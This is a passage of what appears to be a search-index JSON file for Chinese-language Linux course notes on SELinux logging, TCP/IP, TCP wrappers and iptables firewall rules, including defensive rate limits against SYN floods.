\u82e5\u5b89\u88c5\u4e86setroubleshoot\uff0c\u4e14rsyslog\u548cauditd\u5747\u5f00\u542f\uff0c\u5728/var/log/audit/audit.log\u4e2d\u8bb0\u5f55\uff0c\u5e76\u5c06\u5176\u7ffb\u8bd1\u540e\u5199\u5165/var/log/messages\uff0c\u53ef\u8bfb\u6027\u66f4\u597d \u5b89\u88c5setrouble\uff1a $ sudo yum install setroubleshoot-server \uff0c\u7136\u540e\u91cd\u542fauditd\u751f\u6548\u3002","title":"SELinux\u7b80\u4ecb"},{"location":"week03/Socket\u7b80\u4ecb/","text":"Socket\u7b80\u4ecb \u670d\u52a1\u5668/\u5ba2\u6237\u7aef\u4ea4\u4e92\u6d41\u7a0b","title":"Socket \u7b80\u4ecb"},{"location":"week03/Socket\u7b80\u4ecb/#socket","text":"\u670d\u52a1\u5668/\u5ba2\u6237\u7aef\u4ea4\u4e92\u6d41\u7a0b","title":"Socket\u7b80\u4ecb"},{"location":"week03/TCP_IP\u7b80\u4ecb/","text":"TCP/IP\u7b80\u4ecb \u67e5\u770b\u672c\u673a\u7f51\u5173\uff1a ip route show \u67e5\u770b\u6700\u5927\u4f20\u8f93\u5355\u5143\uff08MTU\uff09\uff1a netstat -i OSI\u4e03\u5c42\u7f51\u7edc\u6a21\u578b\uff1a\u7269\u7406\u5c42\uff0c\u6570\u636e\u94fe\u8def\u5c42\uff0c\u7f51\u7edc\u5c42\uff0c\u4f20\u8f93\u5c42\uff0c\u4f1a\u8bdd\u5c42\uff0c\u8868\u793a\u5c42\uff0c\u5e94\u7528\u5c42\u3002 TCP/IP\u56db\u5c42\u6a21\u578b\uff1a\u7f51\u7edc\u63a5\u53e3\u5c42\uff0c\u7f51\u7edc\u5c42\uff0c\u4f20\u8f93\u5c42\uff0c\u5e94\u7528\u5c42\u3002 TCP\u62a5\u6587\uff1a \u6807\u5fd7\u4f4d\uff1a URG\uff1a\u7d27\u6025\u6307\u9488\u6709\u6548 ACK\uff1a\u786e\u8ba4\u5e8f\u53f7 PSH\uff1a\u5c3d\u5feb\u4ea4\u4ed8 RST\uff1a\u91cd\u7f6e\u8fde\u63a5 SYN\uff1a\u540c\u6b65\u5e8f\u53f7 FIN\uff1a\u91ca\u653e\u8fde\u63a5 UDP\u62a5\u6587\u9996\u90e8\u53ea\u67098\u4e2a\u5b57\u8282\uff0c\u5305\u62ec\uff1a\u6e90\u7aef\u53e3\u3001\u76ee\u7684\u7aef\u53e3\u3001\u957f\u5ea6\u3001\u6821\u9a8c\u3002 TCP\u4e09\u6b21\u63e1\u624b\uff1a TCP\u56db\u6b21\u6325\u624b\uff1a \u8d85\u65f6\u91cd\u4f20\uff1a ip \u547d\u4ee4\uff1a link \u7f51\u7edc\u8bbe\u5907 address \u8bbe\u5907\u7684\u534f\u8bae\u5730\u5740 route \u8def\u7531\u8868\u6761\u76ee neighbour ARP/NDISC\u7f13\u51b2\u533a\u6761\u76ee \u7406\u8bba\u8f83\u591a\uff0c\u8be6\u89c1\u300a\u8ba1\u7b97\u673a\u7f51\u7edc\u300b","title":"TCP/IP \u7b80\u4ecb"},{"location":"week03/TCP_IP\u7b80\u4ecb/#tcpip","text":"\u67e5\u770b\u672c\u673a\u7f51\u5173\uff1a ip route show \u67e5\u770b\u6700\u5927\u4f20\u8f93\u5355\u5143\uff08MTU\uff09\uff1a netstat -i OSI\u4e03\u5c42\u7f51\u7edc\u6a21\u578b\uff1a\u7269\u7406\u5c42\uff0c\u6570\u636e\u94fe\u8def\u5c42\uff0c\u7f51\u7edc\u5c42\uff0c\u4f20\u8f93\u5c42\uff0c\u4f1a\u8bdd\u5c42\uff0c\u8868\u793a\u5c42\uff0c\u5e94\u7528\u5c42\u3002 TCP/IP\u56db\u5c42\u6a21\u578b\uff1a\u7f51\u7edc\u63a5\u53e3\u5c42\uff0c\u7f51\u7edc\u5c42\uff0c\u4f20\u8f93\u5c42\uff0c\u5e94\u7528\u5c42\u3002 TCP\u62a5\u6587\uff1a \u6807\u5fd7\u4f4d\uff1a URG\uff1a\u7d27\u6025\u6307\u9488\u6709\u6548 ACK\uff1a\u786e\u8ba4\u5e8f\u53f7 PSH\uff1a\u5c3d\u5feb\u4ea4\u4ed8 RST\uff1a\u91cd\u7f6e\u8fde\u63a5 SYN\uff1a\u540c\u6b65\u5e8f\u53f7 FIN\uff1a\u91ca\u653e\u8fde\u63a5 UDP\u62a5\u6587\u9996\u90e8\u53ea\u67098\u4e2a\u5b57\u8282\uff0c\u5305\u62ec\uff1a\u6e90\u7aef\u53e3\u3001\u76ee\u7684\u7aef\u53e3\u3001\u957f\u5ea6\u3001\u6821\u9a8c\u3002 TCP\u4e09\u6b21\u63e1\u624b\uff1a TCP\u56db\u6b21\u6325\u624b\uff1a \u8d85\u65f6\u91cd\u4f20\uff1a ip \u547d\u4ee4\uff1a link \u7f51\u7edc\u8bbe\u5907 address \u8bbe\u5907\u7684\u534f\u8bae\u5730\u5740 route \u8def\u7531\u8868\u6761\u76ee neighbour ARP/NDISC\u7f13\u51b2\u533a\u6761\u76ee \u7406\u8bba\u8f83\u591a\uff0c\u8be6\u89c1\u300a\u8ba1\u7b97\u673a\u7f51\u7edc\u300b","title":"TCP/IP\u7b80\u4ecb"},{"location":"week03/TCP_wrappers/","text":"TCP wrappers TCP wrappers \u4e3b\u8981\u662f\u901a\u8fc7\u5bf9\u7cfb\u7edf\u4e2d\u7684\u67d0\u4e9b\u670d\u52a1\u8fdb\u884c\u5f00\u653e\u548c\u5173\u95ed\u3001\u5141\u8bb8\u548c\u7981\u6b62\u6765\u6709\u6548\u4fdd\u8bc1\u7cfb\u7edf\u7684\u5b89\u5168\u8fd0\u884c\u3002 \u670d\u52a1\u9700\u94fe\u63a5\u5230 libwrap \u624d\u652f\u6301TCP wrappers\u8fc7\u6ee4\u3002 # \u67e5\u770b\u670d\u52a1\u662f\u5426\u94fe\u63a5\u5230libwrap $ ldd /path/to/service | grep libwrap # \u67e5\u770bsshd\u662f\u5426\u94fe\u63a5\u5230libwrap $ ldd /usr/sbin/sshd | grep libwrap TCP wrappers \u4e3b\u8981\u662f\u4f9d\u9760 /etc/hosts.allow \uff08\u4f18\u5148\u7ea7\u66f4\u9ad8\uff09\u548c /etc/hosts.deny \u6765\u5b9e\u73b0\u9632\u706b\u5899\u7684\u529f\u80fd\uff0c\u89c4\u5219\u7acb\u5373\u751f\u6548\u3002 \u89c4\u5219\u57fa\u672c\u683c\u5f0f\uff1a \u670d\u52a1\u540d:IP\u3001IP\u6bb5\u6216\u4e3b\u673a\u540d:action \u901a\u914d\u7b26 \u542b\u4e49 ALL \u6240\u6709 LOCAL \u540d\u5b57\u91cc\u4e0d\u5e26 . \u7684\u4e3b\u673a KNOWN \u5df2\u77e5\u4e3b\u673a UNKNOWN \u672a\u77e5\u4e3b\u673a PARANOID \u4e3b\u673a\u540d\u548c\u4e3b\u673a\u5730\u5740\u4e0d\u5339\u914d\u7684\u4e3b\u673a .demo.com demo.com \u57df\u540d\u5185\u6240\u6709\u4e3b\u673a 192.168. \u540cIP\u7f51\u6bb5\u7684\u6240\u6709\u4e3b\u673a\uff08 192.168.*.* \uff09 * \u4ee3\u66ff0\u6216\u591a\u4e2a\u5b57\u7b26 IP\u5730\u5740/\u5b50\u7f51\u63a9\u7801 \u63a7\u5236\u67d0\u4e2a\u7f51\u6bb5\u7684\u5730\u5740\u7684\u8bbf\u95ee action\uff1a spwan \u5f00\u542f\u4e00\u4e2ashell\u6267\u884c\u6307\u5b9a\u7684\u547d\u4ee4 twist \u66ff\u6362\u8bbf\u95ee\u8005\u7684\u8bf7\u6c42\u4e3a\u6307\u5b9a\u7684\u547d\u4ee4 \u53c2\u6570 \u542b\u4e49 %a \u5ba2\u6237\u7aef\u7684 IP \u5730\u5740 %A \u670d\u52a1\u7aef\u7684 IP \u5730\u5740 %d \u5b88\u62a4\u8fdb\u7a0b\u7684\u540d\u5b57 %h \u5ba2\u6237\u7aef\u7684\u4e3b\u673a\u540d %H \u670d\u52a1\u7aef\u7684\u4e3b\u673a\u540d %p \u5b88\u62a4\u8fdb\u7a0b\u7684 pid %u \u5ba2\u6237\u7aef\u7684\u7528\u6237\u540d \u3010\u914d\u7f6e\u793a\u4f8b\u3011 \u53ea\u5141\u8bb8192.168.0.0/16\u5b50\u7f51\u548c\u672c\u5730\u8bbf\u95eeXvnc \u5176\u4ed6IP\u5730\u5740\u8bbf\u95eeXvnc\u65f6\uff0c\u4f1a\u8bb0\u5f55\u8bbf\u95ee\u4fe1\u606f\u5230\u65e5\u5fd7/var/log/vncdeny.log\uff0c\u5e76\u62d2\u7edd\u8bbf\u95ee # /etc/hosts.allow Xvnc: 192.168.0.0/16, LOCAL # /etc/hosts.deny Xvnc: ALL : spawn (/bin/echo %a from %h attempted to access %d >> /var/log/vncdeny.log) & \u3010\u53c2\u8003\u3011 man hosts_access man hosts_options","title":"TCP wrappers"},{"location":"week03/TCP_wrappers/#tcp-wrappers","text":"TCP wrappers \u4e3b\u8981\u662f\u901a\u8fc7\u5bf9\u7cfb\u7edf\u4e2d\u7684\u67d0\u4e9b\u670d\u52a1\u8fdb\u884c\u5f00\u653e\u548c\u5173\u95ed\u3001\u5141\u8bb8\u548c\u7981\u6b62\u6765\u6709\u6548\u4fdd\u8bc1\u7cfb\u7edf\u7684\u5b89\u5168\u8fd0\u884c\u3002 \u670d\u52a1\u9700\u94fe\u63a5\u5230 libwrap \u624d\u652f\u6301TCP wrappers\u8fc7\u6ee4\u3002 # \u67e5\u770b\u670d\u52a1\u662f\u5426\u94fe\u63a5\u5230libwrap $ ldd /path/to/service | grep libwrap # \u67e5\u770bsshd\u662f\u5426\u94fe\u63a5\u5230libwrap $ ldd /usr/sbin/sshd | grep libwrap TCP wrappers \u4e3b\u8981\u662f\u4f9d\u9760 /etc/hosts.allow \uff08\u4f18\u5148\u7ea7\u66f4\u9ad8\uff09\u548c /etc/hosts.deny \u6765\u5b9e\u73b0\u9632\u706b\u5899\u7684\u529f\u80fd\uff0c\u89c4\u5219\u7acb\u5373\u751f\u6548\u3002 \u89c4\u5219\u57fa\u672c\u683c\u5f0f\uff1a \u670d\u52a1\u540d:IP\u3001IP\u6bb5\u6216\u4e3b\u673a\u540d:action \u901a\u914d\u7b26 \u542b\u4e49 ALL \u6240\u6709 LOCAL \u540d\u5b57\u91cc\u4e0d\u5e26 . \u7684\u4e3b\u673a KNOWN \u5df2\u77e5\u4e3b\u673a UNKNOWN \u672a\u77e5\u4e3b\u673a PARANOID \u4e3b\u673a\u540d\u548c\u4e3b\u673a\u5730\u5740\u4e0d\u5339\u914d\u7684\u4e3b\u673a .demo.com demo.com \u57df\u540d\u5185\u6240\u6709\u4e3b\u673a 192.168. \u540cIP\u7f51\u6bb5\u7684\u6240\u6709\u4e3b\u673a\uff08 192.168.*.* \uff09 * \u4ee3\u66ff0\u6216\u591a\u4e2a\u5b57\u7b26 IP\u5730\u5740/\u5b50\u7f51\u63a9\u7801 \u63a7\u5236\u67d0\u4e2a\u7f51\u6bb5\u7684\u5730\u5740\u7684\u8bbf\u95ee action\uff1a spwan \u5f00\u542f\u4e00\u4e2ashell\u6267\u884c\u6307\u5b9a\u7684\u547d\u4ee4 twist \u66ff\u6362\u8bbf\u95ee\u8005\u7684\u8bf7\u6c42\u4e3a\u6307\u5b9a\u7684\u547d\u4ee4 \u53c2\u6570 \u542b\u4e49 %a \u5ba2\u6237\u7aef\u7684 IP \u5730\u5740 %A \u670d\u52a1\u7aef\u7684 IP \u5730\u5740 %d \u5b88\u62a4\u8fdb\u7a0b\u7684\u540d\u5b57 %h \u5ba2\u6237\u7aef\u7684\u4e3b\u673a\u540d %H \u670d\u52a1\u7aef\u7684\u4e3b\u673a\u540d %p \u5b88\u62a4\u8fdb\u7a0b\u7684 pid %u \u5ba2\u6237\u7aef\u7684\u7528\u6237\u540d \u3010\u914d\u7f6e\u793a\u4f8b\u3011 \u53ea\u5141\u8bb8192.168.0.0/16\u5b50\u7f51\u548c\u672c\u5730\u8bbf\u95eeXvnc \u5176\u4ed6IP\u5730\u5740\u8bbf\u95eeXvnc\u65f6\uff0c\u4f1a\u8bb0\u5f55\u8bbf\u95ee\u4fe1\u606f\u5230\u65e5\u5fd7/var/log/vncdeny.log\uff0c\u5e76\u62d2\u7edd\u8bbf\u95ee # /etc/hosts.allow Xvnc: 192.168.0.0/16, LOCAL # /etc/hosts.deny Xvnc: ALL : spawn (/bin/echo %a from %h attempted to access %d >> /var/log/vncdeny.log) & \u3010\u53c2\u8003\u3011 man hosts_access man hosts_options","title":"TCP wrappers"},{"location":"week03/iptables\u653b\u51fb\u9632\u5fa1/","text":"iptables\u653b\u51fb\u9632\u5fa1 DDOS\u653b\u51fb\u65b9\u5f0f\uff1a Ping of flood Ping of Death Teardrop attacks UDP flood SYN flood CC SYN\u653b\u51fb\u539f\u7406\uff1a\u901a\u8fc7\u53d1\u9001\u5927\u91cf\u7684\u534a\u8fde\u63a5\u8bf7\u6c42\uff0c\u8017\u8d39\u670d\u52a1\u5668CPU\u548c\u5185\u5b58\u8d44\u6e90\u3002 TCP\u4e09\u6b21\u63e1\u624b\uff1a Client Server | | LISTEN | SYN=1, seq=x | SYN_SENT |----------------------------->| | | | SYN=1, ACK=1, seq=y, ack=x+1 | |<-----------------------------| SYN_RCVD | | | ACK=1, seq=x+1, ack=y+1 | ESTABLISHED |----------------------------->| ESTABLISHED | | SYN flood\uff1a\u670d\u52a1\u5668\u53d8SYN_RCVD\u72b6\u6001\u540e\u5ba2\u6237\u7aef\u4e0d\u4e88\u54cd\u5e94\uff0c\u670d\u52a1\u5668\u4f1a\u4e00\u76f4\u7b49\u5f85\u76f4\u81f3\u8d85\u65f6\uff0c\u8fd9\u79cd\u8fde\u63a5\u88ab\u79f0\u4e3a\u534a\u8fde\u63a5\u3002\u5927\u91cf\u8fd9\u79cd\u534a\u8fde\u63a5\u79f0\u4e3aSYN flood\u3002 SYN\u653b\u51fb\u6a21\u62df\uff1a # \u4f7f\u7528ab\u5de5\u5177\u6a21\u62df\u9ad8\u5e76\u53d1 # -n \u8bf7\u6c42\u6570 -c \u5e76\u53d1\u91cf $ ab -n 10000000 -c 600 http://localhost/ # \u67e5\u770bSYN\u8fde\u63a5\u6570 $ netstat -an | grep SYN # \u589e\u52a0iptables\u8fdb\u884c\u9632\u8303 # \u5bf9SYN\u9650\u5236\u6bcf\u79d2\u6700\u591a1\u4e2a\u8fde\u63a5\uff0c\u63a5\u6536\u7b2c\u4e09\u4e2a\u6570\u636e\u5305\u65f6\u89e6\u53d1 $ sudo iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT # \u6216\u8005\u8bbe\u7f6e\u6bcf\u4e2a\u5ba2\u6237\u7aef\u5e76\u53d1\u6570 $ sudo iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 20 -j REJECT \u8fd8\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539TCP\u7684\u914d\u7f6e\uff08 /etc/sysctl.conf \uff09\u6765\u8fdb\u884c\u9632\u8303\u3002 CC\u653b\u51fb\uff1a\u6a21\u62df\u591a\u4e2a\u7528\u6237\u4e0d\u505c\u8bbf\u95ee\u9700\u8981\u5927\u91cf\u6570\u636e\u64cd\u4f5c\u7684\u9875\u9762\uff0c\u9020\u6210\u7f51\u7edc\u5835\u585e\uff0c\u5c5e\u4e8eTCP\u5168\u8fde\u63a5\u653b\u51fb\u3002\u53ef\u4ee5\u4f7f\u7528\u57df\u540d\u6b3a\u9a97\u89e3\u6790\u3001\u66f4\u6539Web\u7aef\u53e3\u3001IIS\u5c4f\u853dIP\u7b49\u65b9\u5f0f\u8fdb\u884c\u9632\u5fa1\u3002","title":"iptables \u653b\u51fb\u9632\u5fa1"},{"location":"week03/iptables\u653b\u51fb\u9632\u5fa1/#iptables","text":"DDOS\u653b\u51fb\u65b9\u5f0f\uff1a Ping of flood Ping of Death Teardrop attacks UDP flood SYN flood CC SYN\u653b\u51fb\u539f\u7406\uff1a\u901a\u8fc7\u53d1\u9001\u5927\u91cf\u7684\u534a\u8fde\u63a5\u8bf7\u6c42\uff0c\u8017\u8d39\u670d\u52a1\u5668CPU\u548c\u5185\u5b58\u8d44\u6e90\u3002 TCP\u4e09\u6b21\u63e1\u624b\uff1a Client Server | | LISTEN | SYN=1, seq=x | SYN_SENT |----------------------------->| | | | SYN=1, ACK=1, seq=y, ack=x+1 | |<-----------------------------| SYN_RCVD | | | ACK=1, seq=x+1, ack=y+1 | ESTABLISHED |----------------------------->| ESTABLISHED | | SYN flood\uff1a\u670d\u52a1\u5668\u53d8SYN_RCVD\u72b6\u6001\u540e\u5ba2\u6237\u7aef\u4e0d\u4e88\u54cd\u5e94\uff0c\u670d\u52a1\u5668\u4f1a\u4e00\u76f4\u7b49\u5f85\u76f4\u81f3\u8d85\u65f6\uff0c\u8fd9\u79cd\u8fde\u63a5\u88ab\u79f0\u4e3a\u534a\u8fde\u63a5\u3002\u5927\u91cf\u8fd9\u79cd\u534a\u8fde\u63a5\u79f0\u4e3aSYN flood\u3002 SYN\u653b\u51fb\u6a21\u62df\uff1a # \u4f7f\u7528ab\u5de5\u5177\u6a21\u62df\u9ad8\u5e76\u53d1 # -n \u8bf7\u6c42\u6570 -c \u5e76\u53d1\u91cf $ ab -n 10000000 -c 600 http://localhost/ # \u67e5\u770bSYN\u8fde\u63a5\u6570 $ netstat -an | grep SYN # \u589e\u52a0iptables\u8fdb\u884c\u9632\u8303 # \u5bf9SYN\u9650\u5236\u6bcf\u79d2\u6700\u591a1\u4e2a\u8fde\u63a5\uff0c\u63a5\u6536\u7b2c\u4e09\u4e2a\u6570\u636e\u5305\u65f6\u89e6\u53d1 $ sudo iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT # \u6216\u8005\u8bbe\u7f6e\u6bcf\u4e2a\u5ba2\u6237\u7aef\u5e76\u53d1\u6570 $ sudo iptables -A INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 20 -j REJECT \u8fd8\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539TCP\u7684\u914d\u7f6e\uff08 /etc/sysctl.conf \uff09\u6765\u8fdb\u884c\u9632\u8303\u3002 CC\u653b\u51fb\uff1a\u6a21\u62df\u591a\u4e2a\u7528\u6237\u4e0d\u505c\u8bbf\u95ee\u9700\u8981\u5927\u91cf\u6570\u636e\u64cd\u4f5c\u7684\u9875\u9762\uff0c\u9020\u6210\u7f51\u7edc\u5835\u585e\uff0c\u5c5e\u4e8eTCP\u5168\u8fde\u63a5\u653b\u51fb\u3002\u53ef\u4ee5\u4f7f\u7528\u57df\u540d\u6b3a\u9a97\u89e3\u6790\u3001\u66f4\u6539Web\u7aef\u53e3\u3001IIS\u5c4f\u853dIP\u7b49\u65b9\u5f0f\u8fdb\u884c\u9632\u5fa1\u3002","title":"iptables\u653b\u51fb\u9632\u5fa1"},{"location":"week03/iptables\u811a\u672c\u5b9e\u4f8b/","text":"iptables\u811a\u672c\u5b9e\u4f8b \u9ed8\u8ba4\u89c4\u5219\uff1a # \u67e5\u770b\u5f53\u524d\u751f\u6548\u7684\u89c4\u5219 $ sudo iptables-save # \u4ee5:\u5f00\u5934\u7684\u89c4\u5219\u4e3a\u9ed8\u8ba4\u89c4\u5219\uff0c\u9ed8\u8ba4\u6240\u6709chain\u90fd\u662fACCEPT \u6e05\u9664\u89c4\u5219\uff1a # \u6e05\u9664\u89c4\u5219\u94fe\u4e2d\u5df2\u6709\u7684\u6761\u76ee iptables -F # \u6e05\u9664\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u7a7a\u94fe iptables -X # \u6e05\u7a7a\u94fe\u548c\u94fe\u4e2d\u9ed8\u8ba4\u89c4\u5219\u7684\u8ba1\u6570\u5668 iptables -Z \u8f7d\u5165\u6a21\u5757\uff1a modprobe ip_tables # \u542f\u52a8 iptables modprobe iptable_nat # \u4f7f\u7528 nat \u8868\u65f6\u8f7d\u5165 modprobe ip_nat_ftp # \u5728\u51fa\u53bb\u7684\u5305\u505a\u4e86\u4f2a\u88c5\u4ee5\u540e\uff0c\u5c31\u5fc5\u987b\u52a0\u8f7d\u8be5\u6a21\u5757\uff0c\u5426\u5219\u9632\u706b\u5899\u65e0\u6cd5\u77e5\u9053\u8fd4\u56de\u7684\u5305\u8be5\u8f6c\u53d1\u5230\u54ea\u91cc modprobe ip_conntrack_ftp # \u4f7f\u9632\u706b\u5899\u80fd\u591f\u8bc6\u522b FTP \u67d0\u7c7b\u7279\u6b8a\u7684\u8fd4\u56de\u5305 modprobe ip_conntrack # \u4f7f\u9632\u706b\u5899\u5177\u6709\u8fde\u63a5\u8ddf\u8e2a\u80fd\u529b modprobe ipt_MASQUERADE # \u6570\u636e\u5305\u4f2a\u88c5\u7684\u4f5c\u7528 # \u67e5\u770b\u52a0\u8f7d\u7684ip\u76f8\u5173\u6a21\u5757 $ lsmod | grep ip \u6253\u5f00lo\u56de\u73af\uff1a iptables -A INPUT -i lo -j ACCEPT iptables -A OUTPUT -o lo -j ACCEPT \u8bbe\u7f6e\u9ed8\u8ba4\u7b56\u7565\uff1a iptables -P INPUT DROP iptables -P OUTPUT ACCEPT iptables -P FORWARD DROP iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT \u6839\u636e\u9700\u6c42\u5236\u5b9a\u5404\u9879\u89c4\u5219\uff1a # \u5141\u8bb8\u670d\u52a1\u5668ping\u5bf9\u65b9\u4e3b\u673a\u800c\u4e0d\u5141\u8bb8\u5bf9\u65b9\u4e3b\u673aping\u670d\u52a1\u5668 iptables -A INPUT -p icmp -\u2013icmp-type 8 -j DROP iptables -A OUTPUT -p icmp --icmp-type 8 -j ACCEPT iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT # \u5f00\u653e\u4e3b\u673a\u5bf9dns\u7684\u8bbf\u95ee iptables -A INPUT -p udp --sport 53 -j ACCEPT iptables -A OUTPUT -p udp --dport 53 -j ACCEPT # \u5f00\u653e SSH \u7684\u7aef\u53e3\uff0c\u5b9e\u73b0\u8fdc\u7a0b\u8fde\u63a5 iptables -A INPUT -p tcp --dport 22 -j ACCEPT # FTP \u670d\u52a1\u5668\uff0c\u5f00\u542f 21 \u7aef\u53e3 iptables -A INPUT -p tcp --dport 21 -j ACCEPT iptables -A INPUT -p tcp --dport 10000:20000 -j ACCEPT # WEB \u670d\u52a1\u5668,\u5f00\u542f 80 \u7aef\u53e3 iptables -A INPUT -p tcp --dport 80 -j ACCEPT","title":"iptables \u811a\u672c\u5b9e\u4f8b"},{"location":"week03/iptables\u811a\u672c\u5b9e\u4f8b/#iptables","text":"\u9ed8\u8ba4\u89c4\u5219\uff1a # \u67e5\u770b\u5f53\u524d\u751f\u6548\u7684\u89c4\u5219 $ sudo iptables-save # \u4ee5:\u5f00\u5934\u7684\u89c4\u5219\u4e3a\u9ed8\u8ba4\u89c4\u5219\uff0c\u9ed8\u8ba4\u6240\u6709chain\u90fd\u662fACCEPT \u6e05\u9664\u89c4\u5219\uff1a # \u6e05\u9664\u89c4\u5219\u94fe\u4e2d\u5df2\u6709\u7684\u6761\u76ee iptables -F # \u6e05\u9664\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u7a7a\u94fe iptables -X # \u6e05\u7a7a\u94fe\u548c\u94fe\u4e2d\u9ed8\u8ba4\u89c4\u5219\u7684\u8ba1\u6570\u5668 iptables -Z \u8f7d\u5165\u6a21\u5757\uff1a modprobe ip_tables # \u542f\u52a8 iptables modprobe iptable_nat # \u4f7f\u7528 nat \u8868\u65f6\u8f7d\u5165 modprobe ip_nat_ftp # \u5728\u51fa\u53bb\u7684\u5305\u505a\u4e86\u4f2a\u88c5\u4ee5\u540e\uff0c\u5c31\u5fc5\u987b\u52a0\u8f7d\u8be5\u6a21\u5757\uff0c\u5426\u5219\u9632\u706b\u5899\u65e0\u6cd5\u77e5\u9053\u8fd4\u56de\u7684\u5305\u8be5\u8f6c\u53d1\u5230\u54ea\u91cc modprobe ip_conntrack_ftp # \u4f7f\u9632\u706b\u5899\u80fd\u591f\u8bc6\u522b FTP \u67d0\u7c7b\u7279\u6b8a\u7684\u8fd4\u56de\u5305 modprobe ip_conntrack # \u4f7f\u9632\u706b\u5899\u5177\u6709\u8fde\u63a5\u8ddf\u8e2a\u80fd\u529b modprobe ipt_MASQUERADE # \u6570\u636e\u5305\u4f2a\u88c5\u7684\u4f5c\u7528 # \u67e5\u770b\u52a0\u8f7d\u7684ip\u76f8\u5173\u6a21\u5757 $ lsmod | grep ip \u6253\u5f00lo\u56de\u73af\uff1a iptables -A INPUT -i lo -j ACCEPT iptables -A OUTPUT -o lo -j ACCEPT \u8bbe\u7f6e\u9ed8\u8ba4\u7b56\u7565\uff1a iptables -P INPUT DROP iptables -P OUTPUT ACCEPT iptables -P FORWARD DROP iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT \u6839\u636e\u9700\u6c42\u5236\u5b9a\u5404\u9879\u89c4\u5219\uff1a # \u5141\u8bb8\u670d\u52a1\u5668ping\u5bf9\u65b9\u4e3b\u673a\u800c\u4e0d\u5141\u8bb8\u5bf9\u65b9\u4e3b\u673aping\u670d\u52a1\u5668 iptables -A INPUT -p icmp -\u2013icmp-type 8 -j DROP iptables -A OUTPUT -p icmp --icmp-type 8 -j ACCEPT iptables -A INPUT -p icmp --icmp-type 0 -j ACCEPT # \u5f00\u653e\u4e3b\u673a\u5bf9dns\u7684\u8bbf\u95ee iptables -A INPUT -p udp --sport 53 -j ACCEPT iptables -A OUTPUT -p udp --dport 53 -j ACCEPT # \u5f00\u653e SSH \u7684\u7aef\u53e3\uff0c\u5b9e\u73b0\u8fdc\u7a0b\u8fde\u63a5 iptables -A INPUT -p tcp --dport 22 -j ACCEPT # FTP \u670d\u52a1\u5668\uff0c\u5f00\u542f 21 \u7aef\u53e3 iptables -A INPUT -p tcp --dport 21 -j ACCEPT iptables -A INPUT -p tcp --dport 10000:20000 -j ACCEPT # WEB \u670d\u52a1\u5668,\u5f00\u542f 80 \u7aef\u53e3 iptables -A INPUT -p tcp --dport 80 -j ACCEPT","title":"iptables\u811a\u672c\u5b9e\u4f8b"},{"location":"week03/\u521d\u5b66iptables/","text":"\u521d\u5b66iptables Linux\u9632\u706b\u5899\uff1aNetfilter/iptables Netfilter\uff1a\u5de5\u4f5c\u5728\u5185\u6838\u7a7a\u95f4\uff0c\u6267\u884c\u8fc7\u6ee4 iptables\uff1a\u5de5\u4f5c\u5728\u7528\u6237\u7a7a\u95f4\uff0c\u7f16\u5199\u8fc7\u6ee4\u89c4\u5219 \u8bed\u6cd5\u683c\u5f0f\uff1a iptables [-t table] COMMAND chain CRETIRIA -j target ------------------------------------------------------------------------- | | table | COMMAND | chain | CRETIRIA | target | | |--------|---------|-------------|--------------|------------| | | filter | -A | PREROUTING | -p tcp | ACCEPT | | | nat | -I | FORWARD | udp | DROP | | | | -R | INPUT | -s | REJECT | | iptables | | -D | OUTPUT | -d | SNAT | | | | -P | POSTROUTING | --sport | DNAT | | | | -L | | --dport | MASQUERADE | | | | | | -m limit | REDIRECT | | | | | | connlimit | | | | | | | state | | ------------------------------------------------------------------------- \u8868\uff1a table \u8bf4\u660e \u652f\u6301\u7684\u94fe filter \u9ed8\u8ba4\u7684\u8868\uff0c\u5305\u542b\u8fc7\u6ee4\u89c4\u5219 INPUT\u3001FORWARD\u3001OUTPUT NAT \u5305\u542b\u6e90\u3001\u76ee\u7684\u5730\u5740\u548c\u7aef\u53e3\u8f6c\u6362\u4f7f\u7528\u7684\u89c4\u5219 PREROUTING\u3001OUTPUT\u3001POSTROUTING mangle \u8bbe\u7f6e\u7279\u6b8a\u7684\u6570\u636e\u5305\u8def\u7531\u6807\u5fd7\u7684\u89c4\u5219 \u4e94\u4e2a\u94fe\u90fd\u53ef\u4ee5 raw \u5b9e\u73b0\u6570\u636e\u8ddf\u8e2a\uff0c\u662f\u65b0\u589e\u7684\u8868 PREROUTING\u3001OUTPUT \u4f18\u5148\u7ea7\uff1afilter < NAT < mangle < raw COMMAND \u63cf\u8ff0 -A \u65b0\u589e\u89c4\u5219\uff0c\u5728\u5f53\u524d\u94fe\u7684\u6700\u540e\u65b0\u589e\u4e00\u4e2a\u89c4\u5219 -I \u63d2\u5165\u89c4\u5219\uff0c\u628a\u5f53\u524d\u89c4\u5219\u63d2\u5165\u4e3a\u7b2c\u51e0\u6761 -R \u66ff\u6362/\u4fee\u6539\u7b2c\u51e0\u6761\u89c4\u5219 -D \u5220\u9664\u7b2c\u51e0\u6761\u89c4\u5219 -P \u8bbe\u7f6e\u9ed8\u8ba4\u7b56\u7565 -L \u663e\u793a\u6307\u5b9a\u8868\u548c\u6307\u5b9a\u94fe\u7684\u89c4\u5219 # \u6e05\u9664\u89c4\u5219\u94fe\u4e2d\u5df2\u6709\u7684\u6761\u76ee $ sudo iptables -F # \u6e05\u9664\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u7a7a\u94fe $ sudo iptables -X # \u6e05\u7a7a\u94fe\u548c\u94fe\u4e2d\u9ed8\u8ba4\u89c4\u5219\u7684\u8ba1\u6570\u5668 $ sudo iptables -Z \u94fe\uff1a chain \u63cf\u8ff0 PREROUTING \u7528\u4e8e\u8def\u7531\u5224\u65ad\u524d\u7684\u89c4\u5219\uff0c\u5982\u4fee\u6539\u76ee\u7684\u5730\u5740\uff08DNAT\uff09 INPUT \u6570\u636e\u5305\u901a\u8fc7\u8def\u7531\u8ba1\u7b97\u5224\u65ad\u4e3a\u672c\u5730\u7684 Linux \u7cfb\u7edf\u5219\u901a\u8fc7\u6b64\u94fe\u7684\u68c0\u67e5 